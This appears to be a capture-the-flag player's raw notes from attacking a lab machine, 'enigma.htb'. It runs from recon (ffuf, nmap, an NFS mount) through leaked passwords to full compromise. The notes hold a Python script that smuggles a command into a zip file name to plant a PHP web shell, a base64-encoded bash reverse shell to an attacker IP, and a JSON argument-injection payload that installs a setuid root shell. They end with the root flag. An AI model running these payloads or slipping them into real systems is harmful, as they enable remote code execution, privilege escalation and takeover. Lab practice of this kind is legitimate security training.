ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u enigma.htb -mc 200,301,302 -o directories.json


ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt:FUZZ -u http://enigma.htb -mc 200,301,302 -o subdomains.json

ffuf -u http://enigma.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.enigma.htb" -fs 154

nmap -A -T4 -p- -v 10.129.58.231

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://enigma.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL STLS AUTH-RESP-CODE PIPELINING TOP UIDL CAPA
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:   8361:ca20:2e4e:dff6:6e90:1445:7458:9fc3
|_SHA-1: 9f91:b6ed:85b4:517c:0421:c62e:167d:5631:daa6:5a40
|_ssl-date: TLS randomness does not represent time
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100021  1,3,4      35454/udp6  nlockmgr
|_  100021  1,3,4      40517/tcp6  nlockmgr
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: post-login IMAP4rev1 STARTTLS more IDLE LOGINDISABLEDA0001 ID ENABLE have capabilities listed Pre-login LITERAL+ OK LOGIN-REFERRALS SASL-IR
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:   8361:ca20:2e4e:dff6:6e90:1445:7458:9fc3
|_SHA-1: 9f91:b6ed:85b4:517c:0421:c62e:167d:5631:daa6:5a40
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:   8361:ca20:2e4e:dff6:6e90:1445:7458:9fc3
|_SHA-1: 9f91:b6ed:85b4:517c:0421:c62e:167d:5631:daa6:5a40
|_imap-capabilities: post-login IMAP4rev1 more IDLE Pre-login ID ENABLE have capabilities listed OK LITERAL+ LOGIN-REFERRALS SASL-IR AUTH=PLAINA0001
995/tcp   open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:   8361:ca20:2e4e:dff6:6e90:1445:7458:9fc3
|_SHA-1: 9f91:b6ed:85b4:517c:0421:c62e:167d:5631:daa6:5a40
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: RESP-CODES SASL(PLAIN) USER AUTH-RESP-CODE PIPELINING TOP UIDL CAPA
2049/tcp  open  nfs      3-4 (RPC #100003)
35035/tcp open  mountd   1-3 (RPC #100005)
37621/tcp open  status   1 (RPC #100024)
38855/tcp open  mountd   1-3 (RPC #100005)
46133/tcp open  nlockmgr 1-4 (RPC #100021)
51079/tcp open  mountd   1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/13%OT=22%CT=1%CU=38862%PV=Y%DS=2%DC=T%G=Y%TM=6AA6CB1
OS:4%P=aarch64-unknown-linux-gnu)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS
OS:=A)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FC%GCD=1%ISR=10E%
OS:TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=F
OS:E%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)OPS(O1=M4B2ST11NW7%O2=M4B2ST11NW7%O3=M4B2
OS:NNT11NW7%O4=M4B2ST11NW7%O5=M4B2ST11NW7%O6=M4B2ST11)WIN(W1=FE88%W2=FE88%W
OS:3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M4B2NNSNW7%CC=
OS:Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 48.991 days (since Sun Jul 26 12:23:15 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   168.74 ms 10.10.14.1
2   170.52 ms enigma.htb (10.129.58.231)

─$ showmount -e 10.129.58.231
Export list for 10.129.58.231:
/srv/nfs/onboarding *

sudo mount -t nfs 10.129.58.231:/srv/nfs/onboarding /tmp/onboarding -o ro


└─$ ls -la /tmp/onboarding

total 8
drwxr-xr-x  2 root root 4096 Feb 19  2026 .
drwxrwxrwt 15 root root  360 Sep 13 12:41 ..
-rw-r--r--  1 root root 1751 Feb 19  2026 New_Employee_Access.pdf

kevin
Enigma2024!


sarah
Enigma2024!

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s

./openstamanager-rce-exploit --url http://support_001.enigma.htb/ -U admin -P Ne3s4rtars78s --lhost 10.10.15.149 --lport 4444

cat > exploit.py << 'EOF'
import zipfile

cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
EOF

python3 exploit.py

uploading on sales > invocie

we have 

──(ajp㉿kali)-[~/codeplay/OpenSTAManager-RCE-Exploit-CVE-2026-38751]
└─$ curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

echo -n 'bash -i >& /dev/tcp/10.10.15.149/4444 0>&1' | base64 -w0

echo -n 'bash -i >& /dev/tcp/10.10.15.149/4444 0>&1' | base64 -w0

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNDkvNDQ0NCAwPiYx 

curl -G "http://support_001.enigma.htb/files/SHELL.php" --data-urlencode 'c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNDkvNDQ0NCAwPiYx | base64 -d | bash'

config.inc.php

$db_username = 'brollin';
$db_password = 'Fri3nds@9099';



mysql -u brollin -p'Fri3nds@9099' 

harris:bestfriends

cat > /tmp/backdoor.json <<'EOF'
{
  "actionId": "backup_database",
  "actionTitle": "Backup Database",
  "bindingId": "backup_database",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"},
    {"name": "db_name", "value": "production"}
  ]
}
EOF
ls
anagrafiche
backups
dashboard
fatture
importFE_ZIP
impostazioni
provenienze
receiptFE
relazioni_anagrafiche
settori_merceologici
SHELL.php
stato_servizi
temp
utenti
zone
curl -s -X POST \
  -H 'Content-Type: application/json' \
  -H 'Connect-Protocol-Version: 1' \
  --data @/tmp/backdoor.json \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction
{"executionTrackingId":"6c245f83-2bb4-4b27-800a-4e742e209375"}
/tmp/.bs -p
whomai
/tmp/.bs: line 1: whomai: command not found
whoami
root
cat /root/root.txt
022368bdfb846878378f4944fdcda66b
